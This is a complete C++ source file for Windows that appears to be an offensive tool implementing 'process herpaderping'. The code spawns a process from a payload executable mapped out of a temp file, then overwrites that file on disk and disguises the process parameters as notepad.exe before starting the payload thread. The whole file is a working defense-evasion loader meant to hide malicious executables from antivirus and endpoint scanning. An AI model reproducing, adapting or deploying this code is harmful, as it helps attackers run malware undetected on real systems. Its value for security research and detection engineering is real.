#include <Windows.h>
#include <stdio.h>
#include "herpaderping.h"


BYTE* GetPayloadBuffer(char payload[], OUT size_t& p_size) {
	HANDLE hFile = CreateFileA(payload, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] CreateFileW failed. Error:%d \n",GetLastError());
		exit(-1);
	}
	p_size = GetFileSize(hFile, NULL);
	BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (bufferAddress == NULL) {
		printf("[-] VirtualAlloc failed. Error:%d \n", GetLastError());
		exit(-1);
	}
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
		printf("[-] ReadFile failed. Error:%d \n", GetLastError());
		exit(-1);
	}
	CloseHandle(hFile);
	return bufferAddress;
}

ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload, PROCESS_BASIC_INFORMATION pbi) {
	// Functions Declaration
	_RtlImageNtHeader RtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
	
	_NtReadVirtualMemory NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	
	// Retrieving entrypoint of our payload
	BYTE image[0x1000];
	ULONG_PTR entryPoint;
	SIZE_T bytesRead;
	NTSTATUS status;
	ZeroMemory(image, sizeof(image));
	status = NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);
	if (!NT_SUCCESS(status)) {
		printf("[-] NtReadVirtualMemory failed. Error:%d \n", GetLastError());
		exit(-1);
	}
	wprintf(L"[+] Base Address of target process PEB: %p \n", (ULONG_PTR)((PPEB)image)->ImageBaseAddress);
	entryPoint = (RtlImageNtHeader(payload)->OptionalHeader.AddressOfEntryPoint);
	entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;
	wprintf(L"[+] EntryPoint of the payload buffer: %p \n", entryPoint);
	return entryPoint;
}





BOOL Herpaderping(BYTE* payload, size_t payloadSize) {
	_NtCreateSection NtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
	_NtCreateProcessEx NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	_RtlCreateProcessParametersEx RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	
	HANDLE hTemp;
	HANDLE hSection;
	HANDLE hProcess;
	HANDLE hThread;
	NTSTATUS status;
	PROCESS_BASIC_INFORMATION pbi;
	PEB* remotePEB;
	DWORD bytesWritten;
	signed int bufferSize;
	ULONG_PTR entryPoint;
	UNICODE_STRING uTargetFilePath;
	UNICODE_STRING uDllPath;
	PRTL_USER_PROCESS_PARAMETERS processParameters;


	wchar_t tempFile[MAX_PATH] = { 0 };
	wchar_t tempPath[MAX_PATH] = { 0 };
	GetTempPathW(MAX_PATH, tempPath);
	GetTempFileNameW(tempPath, L"HD", 0, tempFile);
	wprintf(L"[+] Creating temp file: %s\n", tempFile);
	//打开一个可读可写的tmp文件
	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
	if (hTemp == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to create temp file....\n");
		exit(-1);
	}
	// 将shellcode写入临时文件中
	if (!WriteFile(hTemp, payload, payloadSize, &bytesWritten, NULL)) {
		perror("[-] Unable to write payload to the file...\n");
		exit(-1);
	}
	wprintf(L"[+] Payload written into the temp file...\n");


	// 将temp文件映射到节中
	// SEC_IMAGE flag is set
	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTemp);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable to create section from temp file...\n");
		exit(-1);
	}
	wprintf(L"[+] Section created from the temp file...\n");

	// Create Process with section
	status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(),
		PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable to create process... \n");
		exit(-1);
	}


	wprintf(L"[+] Spawned the process from the created section...\n");
	// Get remote process information
	status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable to Get Process Information...\n");
		exit(-1);
	}
	// Get the entry point
	entryPoint = GetEntryPoint(hProcess, payload, pbi);


	// Modify the file on disk
	//指向hTemp的文件头
	SetFilePointer(hTemp, 0, 0, FILE_BEGIN);
	bufferSize = GetFileSize(hTemp, 0);
	bufferSize = 0x1000;
	wchar_t bytesToWrite[] = L"0range-x.github.io\n";   //修改tmpfile中的内容
	while (bufferSize > 0) {
		WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
		bufferSize -= bytesWritten;
	}
	wprintf(L"[+] Modified temp file on the disk...\n");


	// Set Process Parameters
	wprintf(L"[+] Crafting process parameters...\n");
	wchar_t targetFilePath[MAX_PATH] = { 0 };
	lstrcpy(targetFilePath, L"C:\\Windows\\System32\\notepad.exe");
	RtlInitUnicodeString(&uTargetFilePath, targetFilePath);
	wchar_t dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING uDllDir = { 0 };
	RtlInitUnicodeString(&uDllPath, dllDir);
	status = RtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
		NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status)) {
		perror("Unable to create process parameters.. \n");
		exit(-1);
	}

	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
	PVOID paramBuffer = processParameters;
	status = NtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		perror("Unable to allocate memory for process parameters.. \n");
		exit(-1);
	}
	status = NtWriteVirtualMemory(hProcess, processParameters, processParameters,
		processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
	if (!NT_SUCCESS(status)) {
		perror("Failed to write process parameters in target process.. \n");
		exit(-1);
	}
	// Getting Remote PEB address
	remotePEB = (PEB*)pbi.PebBaseAddress;
	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) {
		perror("Failed to update process parameters address.. \n");
		exit(-1);
	}
	wprintf(L"[+] Process parameters all set...\n");

	// Create and resume thread
	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
		(LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
	wprintf(L"[+] Thread executed...\n");
	if (!NT_SUCCESS(status)) {
		perror("Unable to start thread.. \n");
		exit(-1);
	}
	CloseHandle(hTemp);
	return TRUE;
}


int main(int argc,char* argv[]) {
	if (argc != 2) {
		printf("[+] Usage:herpaderping.exe C:\\windows\\system32\\calc.exe");
		exit(-1);
	}
	size_t payloadSize;
	BYTE* payloadBuffer = GetPayloadBuffer(argv[1], payloadSize);
	BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);

}